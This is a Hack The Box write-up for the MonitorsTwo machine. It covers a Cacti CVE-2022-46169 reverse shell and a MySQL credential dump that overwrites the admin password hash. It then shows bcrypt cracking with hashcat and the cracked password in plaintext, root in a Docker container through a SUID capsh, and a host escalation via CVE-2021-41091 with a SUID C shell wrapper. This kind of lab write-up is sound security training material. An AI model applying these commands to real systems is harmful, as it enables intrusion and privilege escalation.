# HTB - MonitorsTwo

## Summary

I did this box as it was released and finished it the day after it was released.  
The foothold is kind of lame, it just involves exploiting a CVE which gets us a basic shell in a docker container.  
The docker container escape is also very lame because its just a hash crack of a user's password.  
The privilege escalation is very cool, and involves using root inside the docker container to assist with privilege escalation to root outside of the docker container. 

## Foothold

`nmap` shows ports 22 and 80 open  
if we go to the ip address, we are presented with a `Cacti` login panel  
`ctrl + u` shows us that this is running cacti v1.2.22 which is vulnerable to CVE-2022-46169  

I found 3 python exploits on the internet, and none of them worked out of the box. Combining the third one I found and the first one I found, did the trick eventually and we get a reverse shell.  

About a week after the box got released, this exploit was published which works out of the box:  
https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22  

`python3 cacti_exploit.py -u http://10.10.11.211 --LHOST=10.10.14.2 --LPORT=8686`  
with a nc listner on 8686 gets us a basic shell

<br />

## Enumerating sql database

With our shell on the box, we can immediately tell that we are in a docker container becuase our hostname is that of a docker container. There is a script `/entrypoint.sh` which runs several mysql commands, with the mysql password written in plaintext. We can copy the syntax of the commands this script is running and run:  
`mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"`  
to dump all of the Cacti passwords  

<br />

## Getting Access to the Cacti Panel -- Unnecessary

This step was unnecessary to the exploitation of the box, but I spent a lot of time doing it, so I have decided to include it.  

There is a user marcus and admin listed in the `auth_user` table. Both of their passwords are of the form: `$2y$10$...` which is what is generated by php `password_hash(<password>, PASSOWRD_BCRYPT)`  
We can get the hash for 'password' with:  
`php -a`  
**php >** `echo password_hash("password", PASSWORD_BCRYPT);`  

Then we can run the following sql query to update the database to have our new password instead:  
`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET password='\$2y\$10\$oSrh1y/chWNinlkH/FEoxOiZ4ieXC4O7PCasEAX40AW2wPmGpzG4S' WHERE username = 'admin'"`  

Now we can log in to the Cacti web portal with admin/password. This ended up being useless for exploitation of the box

<br />

## Cracking marcus' password

It turns out marcus' password hash is crackable with hashcat.  

We can identify the type of hash with `hashid password_hash`  
This tells us it is likely a `bcrypt` hash, which is good  
Then, we can run `hashcat --help | grep bcrypt` to find the module id for `bcrypt` which is 3200  

hashcat does not work well on the VM, so I ran it on my physical host with the following:  
```sh
hashcat -a 0 -m 3200 password_hash /usr/share/wordlists/rockyou.txt -w 3
```  

We find that marcus' password is funkymonkey, which we can use to ssh as him and get acess to the host

<br />

## Root on the docker Container

As marcus, there are not many obvious privilege escalation paths. Linpeas does not tell us this, but the Docker version is `20.10.5` which is vulnerable to `CVE-2021-41091`.  

Basically, if we had root on the Docker container, we could follow this article to get root on the host:  
https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure  

To get root on the docker container:  
`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`  
`/sbin/capsh` has suid bit set  
GTFO bins tells us that we can privesc to root with: `capsh --gid=0 --uid=0 --`  

<br />

## Privesc marcus to root

First, we need to find where the docker container's overlay mount is with:  
`findmnt` or `mount | grep overlay`  
In this case it was:  
`/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`  

We can `cd` there, and then `cd` to `./tmp`  

Because we have root on the docker container, we can create the following file, compile it, and set its suid bit:

privesc.c:
```C
// gcc privesc.c -o privesc
int main()
{
  setuid(0);
  system("/bin/sh -p");
}
```

Then, as root on the docker container:  
`chmod u+s privesc`  
`chmod +x privesc`  

Then, running `./privesc` as marcus on the host gets us root  

